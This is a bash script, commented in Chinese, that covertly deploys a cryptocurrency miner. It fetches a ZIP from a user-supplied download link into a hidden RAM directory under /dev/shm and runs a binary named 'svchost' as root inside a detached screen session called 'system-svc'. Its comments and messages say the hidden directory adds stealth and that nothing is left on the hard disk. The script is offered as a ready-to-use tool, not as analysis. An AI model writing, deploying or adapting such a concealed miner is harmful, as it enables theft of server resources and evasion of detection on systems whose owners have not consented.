#!/bin/bash

# --- START: 请修改此处的下载链接 ---
# 将下面的链接替换为您上传 ZIP 包后获得的真实直接下载链接
ARTIFACT_ZIP_URL="YOUR_DIRECT_DOWNLOAD_LINK_HERE"
# --- END: 修改结束 ---

# 1. 安装必要的工具 (unzip 用于解压, screen 用于后台运行)
echo "正在安装依赖工具..."
sudo apt-get update > /dev/null 2>&1
sudo apt-get install -y unzip screen > /dev/null 2>&1

# 2. 检查是否以 root 权限运行
if [ "$(id -u)" != "0" ]; then
   echo "错误：此操作需要 root 权限。请使用 'sudo' 运行此脚本或切换到 root 用户。" 1>&2
   exit 1
fi

# 3. 定义内存盘中的工作目录（使用隐藏目录以增强隐蔽性）
RAM_DIR="/dev/shm/.system-runtime"

# 4. 检查链接是否已替换
if [ "$ARTIFACT_ZIP_URL" == "YOUR_DIRECT_DOWNLOAD_LINK_HERE" ]; then
    echo "错误：请先编辑此脚本，将 ARTIFACT_ZIP_URL 替换为您的真实直接下载链接。"
    exit 1
fi

echo "依赖安装完毕。准备在后台启动安全服务..."

# 5. 使用 screen 创建一个在后台独立运行的会话，并执行所有核心操作
#    -d -m: 创建一个分离的(detached)会话
#    -S system-svc: 为会话命名，方便管理
screen -d -m -S system-svc bash -c "
    # 在 screen 会话内部执行的命令

    # 创建内存工作目录并进入
    mkdir -p '$RAM_DIR'
    cd '$RAM_DIR'

    # 从您的链接下载压缩包
    wget -q -O miner.zip '$ARTIFACT_ZIP_URL'

    # 检查下载是否成功
    if [ \$? -ne 0 ]; then
        # 下载失败，可以添加日志或退出
        exit 1
    fi

    # 解压文件 (svchost 和 config.json)
    unzip -q miner.zip

    # 赋予执行权限
    chmod +x svchost

    # 以 root 权限运行挖矿程序（因为配置中启用了 Huge Pages 和 MSR）
    # 程序将在后台持续运行，直到被手动停止或服务器重启
    ./svchost
"

# 检查 screen 会话是否成功创建
if screen -list | grep -q "system-svc"; then
    echo "成功！"
    echo "服务已在名为 'system-svc' 的后台会话中启动。"
    echo "所有文件均在内存中运行，硬盘上无任何痕迹。"
    echo "您现在可以安全地关闭 SSH 连接。"
else
    echo "错误：无法启动后台服务。请检查 screen 是否已正确安装。"
fi
